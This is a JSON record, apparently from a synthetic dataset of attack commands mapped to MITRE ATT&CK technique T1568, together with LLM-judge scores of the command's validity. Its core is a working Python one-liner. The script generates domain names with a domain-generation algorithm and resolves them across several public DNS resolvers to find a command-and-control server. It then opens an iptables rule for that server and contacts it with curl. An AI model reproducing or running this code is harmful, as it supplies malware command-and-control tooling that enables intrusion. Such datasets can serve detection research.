{
  "technique_id": "T1568",
  "platform": "Linux",
  "shell": "Python",
  "command": "python3 -c \"import random,datetime,hashlib,subprocess; from collections import Counter; from scapy.all import IP,UDP,DNS,DNSQR,sr1\nseed='consensus'; tlds=['net','org','com']\ndef dga(n):\n    base=str(datetime.datetime.utcnow().strftime('%Y%m%d'))+seed\n    return [hashlib.sha256((base+str(i)).encode()).hexdigest()[:11]+'.'+tlds[i%len(tlds)] for i in range(n)]\nresolvers=['8.8.8.8','1.1.1.1','9.9.9.9']\ndom=None; ip=None; port=random.choice([8443,5359,16000])\nfor d in dga(20):\n    ips=[]\n    for r in resolvers:\n        resp=sr1(IP(dst=r)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=d,qtype='A')),timeout=2,verbose=0)\n        if resp and resp[DNS] and resp[DNS].an:\n            for a in resp[DNS].an:\n                if getattr(a,'type',0)==1:\n                    ips.append(a.rdata)\n    if ips:\n        c=Counter(ips).most_common(1)[0]\n        if c[1]>=2:\n            dom=d; ip=c[0]; break\nif ip and dom:\n    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n    subprocess.run(['curl','-sS','--connect-timeout','3','--resolve',f'{dom}:{port}:{ip}',f'https://{dom}:{port}/ok','-k'])\n    print(dom,ip,port)\"",
  "explanation": "Achieves dynamic C2 resolution by querying multiple resolvers and selecting an IP that appears in at least two answers to reduce poisoning/noise.",
  "rationale_steps": [
    "Generate a set of DGA domains for trial.",
    "Query 3 public resolvers and collect A answers for each candidate.",
    "Pick the IP with resolver consensus to stabilize dynamic selection.",
    "Allowlist and probe the chosen irregular port at the resolved IP."
  ],
  "obfuscation_level": "none",
  "id": "SYN-PYTHON-T1568-c17789a5-a15b04ba",
  "source_prompt_hash": "c17789a5",
  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and proper syntax throughout the entire script.",
        "semantic_score": 5,
        "semantic_justification": "The command fully implements the T1568 Dynamic Resolution technique by using a DGA algorithm to generate domains, querying multiple DNS resolvers, validating responses across resolvers, and establishing a connection to the resolved C2 server.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-02T07:36:51.364081Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The Python script is perfectly well-formed with no syntax errors, balanced constructs, and valid command line invocation for python3 -c.",
        "semantic_score": 3,
        "semantic_justification": "While the DGA and dynamic resolution components are excellent implementations of the technique, the inclusion of an 'iptables' command requiring root privileges makes the overall C2 establishment operationally implausible under the stated 'Privilege: None' constraint, causing a significant realism gap for the command's full intent.",
        "combined_score": 4.0,
        "confidence": 0.9,
        "timestamp": "2025-10-02T07:36:59.211194Z"
      },
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The quoted Python one-liner is well-formed with balanced quotes, valid imports, correct indentation/newlines, and properly constructed subprocess calls and flags.",
        "semantic_score": 4,
        "semantic_justification": "It implements a DGA and multi-resolver consensus to dynamically resolve a C2 endpoint and attempts a connection, but practical execution may falter without root for scapy/iptables and relies on attacker-registered DGA domains.",
        "combined_score": 4.5,
        "confidence": 0.82,
        "timestamp": "2025-10-02T07:37:49.273607Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 4.0,
    "llm_average_score": 4.5,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}